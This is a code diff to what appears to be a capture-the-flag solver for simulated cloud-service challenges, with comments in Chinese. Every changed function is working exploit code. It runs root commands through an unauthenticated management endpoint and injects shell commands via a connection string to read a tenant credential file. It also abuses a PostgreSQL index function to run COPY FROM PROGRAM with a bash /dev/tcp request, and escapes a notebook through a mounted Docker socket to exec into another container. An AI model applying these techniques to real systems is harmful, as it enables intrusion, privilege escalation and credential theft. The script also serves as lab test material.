@@ -55,7 +55,10 @@ def cloud_21(base: str, flag: str) -> None:
 
 
 def cloud_22(base: str, flag: str) -> None:
-    response = json_request("POST", f"{base}/wsman/exec", {"cmd": "id; cat /root/flag.txt"})
+    # 未鉴权管理通道 → 以 root 在中间件容器里取供应商密钥库交付的密文
+    store = ("python3 -c \"import urllib.request;"
+             "print(urllib.request.urlopen('http://flag-vault:5000/flag').read().decode())\"")
+    response = json_request("POST", f"{base}/wsman/exec", {"cmd": "id; " + store})
     assert response.status == 200 and response.json()["user"] == "root"
     require_flag(response.body, flag)
 
@@ -120,8 +123,12 @@ def cloud_12(base: str, flag: str) -> None:
 
 
 def cloud_15(base: str, flag: str) -> None:
+    # 注入的命令在共享运行时里执行：同租户凭据在 /app/memory.json，
+    # 供应商密钥库的密文则按运行时地址向 flag-vault 换取
+    leak = ("cat /app/memory.json; python3 -c \"import urllib.request;"
+            "print(urllib.request.urlopen('http://flag-vault:5000/flag').read().decode())\"")
     body = {"driver": "Redshift", "runtime_name": "AutoResolveIntegrationRuntime",
-            "connection_string": "Driver={Redshift};LOGIN_URL={cat /app/memory.json;}"}
+            "connection_string": f"Driver={{Redshift}};LOGIN_URL={{{leak}}}"}
     response = json_request("POST", f"{base}/pipeline", body)
     assert response.status == 200
     require_flag(response.body, flag)
@@ -197,7 +204,13 @@ def cloud_14(base: str, flag: str) -> None:
     assert sql("CREATE FUNCTION suid(text) RETURNS text IMMUTABLE AS 'SELECT ''nothing''' LANGUAGE sql").status == 200
     assert sql("CREATE INDEX idx_malicious ON temp_table (suid(data))").status == 200
     assert sql("ALTER TABLE temp_table OWNER TO cloudsqladmin").status == 200
-    assert sql("CREATE OR REPLACE FUNCTION suid(text) RETURNS text VOLATILE AS $$ COPY public.shell_commands_results (data) FROM PROGRAM 'cat /host_flag.txt'; SELECT 'done' $$ LANGUAGE sql").status == 200
+    # 索引表达式里的函数以 provider super-role 执行：直接向 flag-vault 取密文
+    # （bash 的 /dev/tcp 走内网；程序用 $p$ 引用，避免与外层 $$ 函数体撞标签）
+    program = (r'bash -c "exec 3<>/dev/tcp/flag-vault/5000; printf '
+               r"'GET /flag HTTP/1.0\r\n\r\n'"
+               r' >&3; timeout 5 cat <&3"')
+    assert sql("CREATE OR REPLACE FUNCTION suid(text) RETURNS text VOLATILE AS $$ COPY public.shell_commands_results (data) FROM PROGRAM $p$"
+               + program + "$p$; SELECT 'done' $$ LANGUAGE sql").status == 200
     assert sql("ANALYZE public.temp_table").status == 200
     require_flag(sql("SELECT * FROM shell_commands_results").body, flag)
 
@@ -334,49 +347,73 @@ def cloud_31(base: str, flag: str) -> None:
 
 
 def cloud_06(base: str, flag: str) -> None:
-    code = """import json,socket
+    """笔记本逃逸（挂载宿主机 docker socket）→ 宿主机上的容器任人摆布 →
+    直接进 flag-vault 容器把密文读出来。"""
+    code = """import json,socket,sys
 def call(method,path,body=None):
     s=socket.socket(socket.AF_UNIX)
+    s.settimeout(10)
     s.connect("/var/run/docker.sock")
     data=b"" if body is None else json.dumps(body).encode()
     req=(method+" "+path+" HTTP/1.1\\r\\nHost: docker\\r\\nContent-Type: application/json\\r\\nContent-Length: "+str(len(data))+"\\r\\nConnection: close\\r\\n\\r\\n").encode()+data
     s.sendall(req)
     head=b""
     while b"\\r\\n\\r\\n" not in head:
-        chunk=s.recv(4096)
+        try:
+            chunk=s.recv(4096)
+        except OSError:
+            break
         if not chunk:
             break
         head+=chunk
     first,_,rest=head.partition(b"\\r\\n\\r\\n")
     clen=0
+    chunked=b"transfer-encoding: chunked" in first.lower()
     for line in first.split(b"\\r\\n"):
         if line.lower().startswith(b"content-length:"):
             clen=int(line.split(b":",1)[1].strip())
-    if clen:
-        while len(rest)<clen:
-            chunk=s.recv(65536)
-            if not chunk:
-                break
-            rest+=chunk
-        rest=rest[:clen]
-    else:
-        while True:
-            chunk=s.recv(65536)
-            if not chunk:
-                break
-            rest+=chunk
+    while clen and len(rest)<clen:
+        try:
+            part=s.recv(65536)
+        except OSError:
+            break
+        if not part:
+            break
+        rest+=part
+    while not clen and not (chunked and rest.endswith(b"0\\r\\n\\r\\n")):
+        try:
+            part=s.recv(65536)
+        except OSError:
+            break
+        if not part:
+            break
+        rest+=part
     s.close()
-    return int(first.split(b" ")[1]), rest.decode()
-cfg={"Image":"python:3.11-slim","Cmd":["cat","/mnt/flag/flag.txt"],"HostConfig":{"Binds":["/tmp/cloud-06-flag:/mnt/flag:ro"]}}
-status,body=call("POST","/containers/create",cfg)
-if status!=201:
-    raise SystemExit(body)
-cid=json.loads(body)["Id"]
-call("POST","/containers/"+cid+"/start")
-call("POST","/containers/"+cid+"/wait")
-status,logs=call("GET","/containers/"+cid+"/logs?stdout=1&stderr=1")
-call("DELETE","/containers/"+cid+"?force=1")
-print(logs)
+    if clen:
+        rest=rest[:clen]
+    if chunked:
+        out=b""
+        i=0
+        while True:
+            j=rest.find(b"\\r\\n",i)
+            if j<0:
+                break
+            try:
+                n=int(rest[i:j].split(b";")[0],16)
+            except ValueError:
+                break
+            if n==0:
+                break
+            out+=rest[j+2:j+2+n]
+            i=j+2+n+2
+        rest=out
+    return int(first.split(b" ")[1]), rest.decode(errors="replace")
+status,body=call("GET","/containers/json?all=1")
+vault=[c for c in json.loads(body) if any("flag-vault" in n for n in c["Names"])][0]["Id"]
+status,body=call("POST","/containers/"+vault+"/exec",{"Cmd":["cat","/vault/flag"],"AttachStdout":True,"Tty":True})
+exec_id=json.loads(body)["Id"]
+status,body=call("POST","/exec/"+exec_id+"/start",{"Detach":False,"Tty":True})
+sys.stdout.write(body)
 """
     response = http("POST", f"{base}/step2", data=urllib.parse.urlencode({"code": code}).encode(),
                     headers={"Content-Type": "application/x-www-form-urlencoded"})
